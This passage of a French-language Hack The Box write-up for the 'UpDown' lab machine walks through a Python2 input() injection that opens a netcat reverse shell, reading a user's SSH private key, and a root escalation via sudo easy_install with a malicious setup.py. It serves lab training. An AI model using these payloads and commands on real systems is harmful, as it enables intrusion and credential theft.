+</span></span><span class=line><span class=cl>-rwxr-x--- <span class=m>1</span> developer www-data   <span class=m>154</span> Jun <span class=m>22</span>  <span class=m>2022</span> siteisup_test.py
+</span></span></code></pre></td></tr></table></div></div><p>Dans ce code Python, on observe l&rsquo;utilisation de la fonction &ldquo;input&rdquo;. De plus, le code est executé avec Python2 et non pas Python3. Sous Python2, lors de l&rsquo;utilisation de la fonction &ldquo;input&rdquo; Python ne considère pas par défaut qu&rsquo;il s&rsquo;agit d&rsquo;une String, et tente donc de le parser. On peut donc injecter du code python pour ouvrir un reverse shell. Sous Python3, la sortie de input("") est une Str par défaut donc pas d&rsquo;injection possible :</p><p>Payload:</p><blockquote><p><strong>import</strong>(&lsquo;os&rsquo;).system(&lsquo;rm /tmp/b;mkfifo /tmp/b;cat /tmp/b|bash -i 2>&amp;1|nc 10.10.14.14 8888 >/tmp/b&rsquo;)</p></blockquote><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=nb>input</span><span class=p>(</span><span class=s2>&#34;Enter URL here:&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>page</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>page</span><span class=o>.</span><span class=n>status_code</span> <span class=o>==</span> <span class=mi>200</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>	<span class=nb>print</span> <span class=s2>&#34;Website is up&#34;</span>
+</span></span><span class=line><span class=cl><span class=k>else</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>	<span class=nb>print</span> <span class=s2>&#34;Website is down&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>-------------------------</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>www</span><span class=o>-</span><span class=n>data</span><span class=nd>@updown</span><span class=p>:</span><span class=o>/</span><span class=n>home</span><span class=o>/</span><span class=n>developer</span><span class=o>/</span><span class=n>dev</span><span class=err>$</span> <span class=o>./</span><span class=n>siteisup</span>         
+</span></span><span class=line><span class=cl><span class=n>Welcome</span> <span class=n>to</span> <span class=s1>&#39;siteisup.htb&#39;</span> <span class=n>application</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>Enter</span> <span class=n>URL</span> <span class=n>here</span><span class=p>:</span><span class=nb>__import__</span><span class=p>(</span><span class=s1>&#39;os&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>system</span><span class=p>(</span><span class=s1>&#39;rm /tmp/b;mkfifo /tmp/b;cat /tmp/b|bash -i 2&gt;&amp;1|nc 10.10.14.14 8888 &gt;/tmp/b&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>rm</span><span class=p>:</span> <span class=n>cannot</span> <span class=n>remove</span> <span class=s1>&#39;/tmp/b&#39;</span><span class=p>:</span> <span class=n>No</span> <span class=n>such</span> <span class=n>file</span> <span class=ow>or</span> <span class=n>directory</span>
+</span></span></code></pre></td></tr></table></div></div><p>On obtient un nouveau reverse shell en tant que &lsquo;developer&rsquo;</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ nc -lnvp <span class=m>8888</span> 
+</span></span><span class=line><span class=cl>Ncat: Version 7.93 <span class=o>(</span> https://nmap.org/ncat <span class=o>)</span>
+</span></span><span class=line><span class=cl>Ncat: Listening on :::8888
+</span></span><span class=line><span class=cl>Ncat: Listening on 0.0.0.0:8888
+</span></span><span class=line><span class=cl>Ncat: Connection from 10.10.11.177.
+</span></span><span class=line><span class=cl>Ncat: Connection from 10.10.11.177:45492.
+</span></span><span class=line><span class=cl>developer@updown:/home/developer/dev$ whoami
+</span></span><span class=line><span class=cl>whoami
+</span></span><span class=line><span class=cl>developer
+</span></span><span class=line><span class=cl>developer@updown:/home/developer/dev$ <span class=nb>cd</span> ..
+</span></span><span class=line><span class=cl>developer@updown:/home/developer$ ls -l .ssh
+</span></span><span class=line><span class=cl>ls -l .ssh
+</span></span><span class=line><span class=cl>total <span class=m>12</span>
+</span></span><span class=line><span class=cl>-rw-rw-r-- <span class=m>1</span> developer developer  <span class=m>572</span> Aug  <span class=m>2</span>  <span class=m>2022</span> authorized_keys
+</span></span><span class=line><span class=cl>-rw------- <span class=m>1</span> developer developer <span class=m>2602</span> Aug  <span class=m>2</span>  <span class=m>2022</span> id_rsa
+</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> developer developer  <span class=m>572</span> Aug  <span class=m>2</span>  <span class=m>2022</span> id_rsa.pub
+</span></span><span class=line><span class=cl>developer@updown:/home/developer$ cat .ssh/id_rsa
+</span></span><span class=line><span class=cl>cat .ssh/id_rsa
+</span></span><span class=line><span class=cl>-----BEGIN OPENSSH PRIVATE KEY-----
+</span></span><span class=line><span class=cl>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
+</span></span><span class=line><span class=cl>........
+</span></span><span class=line><span class=cl>3zga8EzubgwnpU7r9hN2jWboCCIOeDtvXFv08KT8pFDCCA+sMa5uoWQlBqmsOWCLvtaOWe
+</span></span><span class=line><span class=cl>N4jA+ppn1+3e0AAAASZGV2ZWxvcGVyQHNpdGVpc3VwAQ<span class=o>==</span>
+</span></span><span class=line><span class=cl>-----END OPENSSH PRIVATE KEY-----
+</span></span></code></pre></td></tr></table></div></div><p>On trouve la clé SSH de <strong>developer</strong> nous permettant de nous connecter facilement via ce protocole :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ vim developer.key
+</span></span><span class=line><span class=cl>$ chmod <span class=m>600</span> developer.key 
+</span></span><span class=line><span class=cl>$ ssh developer@10.10.11.177 -i developer.key
+</span></span><span class=line><span class=cl>Welcome to Ubuntu 20.04.5 LTS <span class=o>(</span>GNU/Linux 5.4.0-122-generic x86_64<span class=o>)</span>
+</span></span><span class=line><span class=cl>....
+</span></span><span class=line><span class=cl>Last login: Tue Aug <span class=m>30</span> 11:24:44 <span class=m>2022</span> from 10.10.14.36
+</span></span><span class=line><span class=cl>developer@updown:~$ cat user.txt 
+</span></span><span class=line><span class=cl>d235....edcf
+</span></span></code></pre></td></tr></table></div></div><h2 id=developer---root>developer -> root</h2><h3 id=easy_install-as-root>easy_install as root</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>developer@updown:~$ sudo -l
+</span></span><span class=line><span class=cl>Matching Defaults entries <span class=k>for</span> developer on localhost:
+</span></span><span class=line><span class=cl>    env_reset, mail_badpass, <span class=nv>secure_path</span><span class=o>=</span>/usr/local/sbin<span class=se>\:</span>/usr/local/bin<span class=se>\:</span>/usr/sbin<span class=se>\:</span>/usr/bin<span class=se>\:</span>/sbin<span class=se>\:</span>/bin<span class=se>\:</span>/snap/bin
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>User developer may run the following commands on localhost:
+</span></span><span class=line><span class=cl>    <span class=o>(</span>ALL<span class=o>)</span> NOPASSWD: /usr/local/bin/easy_install
+</span></span></code></pre></td></tr></table></div></div><p>Sur GTFObins, on trouve un chemin d&rsquo;exploitation pour passer root:<br><a class=link href=https://gtfobins.github.io/gtfobins/easy_install/ target=_blank rel=noopener>https://gtfobins.github.io/gtfobins/easy_install/</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>TF</span><span class=o>=</span><span class=k>$(</span>mktemp -d<span class=k>)</span>
+</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;import os; os.execl(&#39;/bin/sh&#39;, &#39;sh&#39;, &#39;-c&#39;, &#39;sh &lt;</span><span class=k>$(</span>tty<span class=k>)</span><span class=s2> &gt;</span><span class=k>$(</span>tty<span class=k>)</span><span class=s2> 2&gt;</span><span class=k>$(</span>tty<span class=k>)</span><span class=s2>&#39;)&#34;</span> &gt; <span class=nv>$TF</span>/setup.py
+</span></span><span class=line><span class=cl>sudo easy_install <span class=nv>$TF</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>------------------------
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>developer@updown:/tmp$ <span class=nv>TF</span><span class=o>=</span><span class=k>$(</span>mktemp -d<span class=k>)</span>
+</span></span><span class=line><span class=cl>developer@updown:/tmp$ <span class=nb>echo</span> <span class=s2>&#34;import os; os.execl(&#39;/bin/sh&#39;, &#39;sh&#39;, &#39;-c&#39;, &#39;sh &lt;</span><span class=k>$(</span>tty<span class=k>)</span><span class=s2> &gt;</span><span class=k>$(</span>tty<span class=k>)</span><span class=s2> 2&gt;</span><span class=k>$(</span>tty<span class=k>)</span><span class=s2>&#39;)&#34;</span> &gt; <span class=nv>$TF</span>/setup.py
+</span></span><span class=line><span class=cl>developer@updown:/tmp$ sudo easy_install <span class=nv>$TF</span>
+</span></span><span class=line><span class=cl>WARNING: The easy_install <span class=nb>command</span> is deprecated and will be removed in a future version.
+</span></span><span class=line><span class=cl>Processing tmp.hlSwiYYkel
+</span></span><span class=line><span class=cl>Writing /tmp/tmp.hlSwiYYkel/setup.cfg
+</span></span><span class=line><span class=cl>Running setup.py -q bdist_egg --dist-dir /tmp/tmp.hlSwiYYkel/egg-dist-tmp-KNZfWR
+</span></span><span class=line><span class=cl><span class=c1># whoami</span>
+</span></span><span class=line><span class=cl>root
+</span></span><span class=line><span class=cl><span class=c1># cat /root/root.txt   </span>
+</span></span><span class=line><span class=cl>7077....3986
+</span></span></code></pre></td></tr></table></div></div><p>Il suffit de créer un dossier, avec un fichier setup.py expliquant comment notre module python doit s&rsquo;installer. On injecte un code malveillant dans ce fichier et il sera executer en tant que root lors du lancement de <strong>easy_install</strong>.</p></section><footer class=article-footer><section class=article-tags><a href=/tags/linux/>Linux</a>
+<a href=/tags/medium/>Medium</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
+<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><aside class=related-content--wrapper><h2 class=section-title>Related content</h2><div class=related-content><div class="flex article-list--tile"><article><a href=/p/monitored-htb/><div class=article-details><h2 class=article-title>HTB | Monitored</h2></div></a></article><article><a href=/p/builder-htb/><div class=article-details><h2 class=article-title>HTB | Builder</h2></div></a></article><article><a href=/p/magic-htb/><div class=article-details><h2 class=article-title>HTB | Magic</h2></div></a></article><article><a href=/p/solidstate-htb/><div class=article-details><h2 class=article-title>HTB | SolidState</h2></div></a></article><article><a href=/p/cronos-htb/><div class=article-details><h2 class=article-title>HTB | Cronos</h2></div></a></article></div></div></aside><div class=disqus-container><div id=disqus_thread></div><script>window.disqus_config=function(){},function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById("disqus_thread").innerHTML="Disqus comments not available by default when the website is previewed locally.";return}var t=document,e=t.createElement("script");e.async=!0,e.src="//hugo-theme-stack.disqus.com/embed.js",e.setAttribute("data-timestamp",+new Date),(t.head||t.body).appendChild(e)}()</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></div><style>.disqus-container{background-color:var(--card-background);border-radius:var(--card-border-radius);box-shadow:var(--shadow-l1);padding:var(--card-padding)}</style><script>window.addEventListener("onColorSchemeChange",e=>{typeof DISQUS=="object"&&DISQUS.reset({reload:!0})})</script><footer class=site-footer><section class=copyright>&copy;
+2020 -
+2026 leopoldabgn's Blog</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.33.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+<button class="pswp__button pswp__button--share" title=Share></button>
+<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+</button>
+<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.c922af694cc257bf1ecc41c0dd7b0430f9114ec280ccf67cd2c6ad55f5316c4e.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>
